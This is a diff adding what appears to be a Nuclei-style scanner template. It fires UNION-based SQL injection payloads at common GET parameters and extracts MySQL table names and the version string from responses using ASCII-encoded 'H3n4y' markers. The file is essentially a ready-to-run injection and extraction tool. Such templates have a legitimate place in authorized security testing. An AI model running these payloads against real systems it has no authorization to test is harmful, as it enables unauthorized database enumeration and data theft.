@@ -1,0 +1,59 @@
+id: sqli-union-capture-h3n4y
+info:
+  name: SQLi - UNION (marker H3n4y)
+  author: Jun Min
+  severity: high
+  description: Attempts UNION‑based payloads across columns and extracts all H3n4y(...)H3n4y markers from responses for authenticated targets.
+  
+  tags:
+    - sqli
+    - union
+    - enum
+    - mysql
+
+requests:
+  - id: sqli-union-capture
+    method: GET
+    path:
+      - "{{BaseURL}}?{{param}}={{payload}}"
+
+    attack: clusterbomb
+    payloads:
+      param:
+        - username
+        - user
+        - name
+        - email
+        - id
+        - search
+      payload:
+        # Table name enumeration (LIMIT 1 to 6)
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 2),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 3),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 4),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 5),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 6),CHAR(72,51,110,52,121))-- -"
+        
+        # version() in multiple column positions (marker H3n4y in ASCII)
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),version(),CHAR(72,51,110,52,121))-- -"
+
+    stop-at-first-match: true
+    threads: 10
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "H3n4y(.*?)H3n4y"
+      - type: regex
+        part: header
+        regex:
+          - "H3n4y(.*?)H3n4y"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "H3n4y(.*?)H3n4y"
